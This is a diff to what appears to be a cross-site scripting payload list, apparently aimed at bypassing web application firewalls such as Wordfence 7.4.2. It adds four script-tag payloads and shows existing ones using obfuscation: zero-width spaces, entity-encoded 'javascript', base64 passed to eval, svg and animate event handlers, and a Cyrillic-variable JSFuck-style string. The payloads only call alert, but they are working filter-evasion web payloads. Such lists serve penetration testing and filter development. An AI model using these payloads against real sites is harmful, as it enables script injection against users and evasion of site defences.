@@ -12,6 +12,10 @@
 <img src=x onerror​=ja&#x76;ascript​:al&#x65;rt(1)>
 <svg onload​=eval(atob('YWxlcnQoJ1hTUycp'))></svg>
 <input autofocus onfocus​=alert(1)>
+<script>delete/delete; //alert(1)</script>
+<script>typeof/typeof; //alert(2)</script>
+<script>void/void; //alert(3)</script>
+<script>throw/throw; //alert(4)</script>
 <svg xmlns="http://w3.org/2000/svg"><​script>alert(2)<​/script></svg>
 <svg xmlns="http://w3.org/2000/svg" onload​=alert(2)></svg>
 <svg xmlns="http://w3.org/2000/svg"><animate onbegin​=alert(2) attributeName=x dur=1s></animate></svg>
@@ -1768,6 +1772,7 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
 
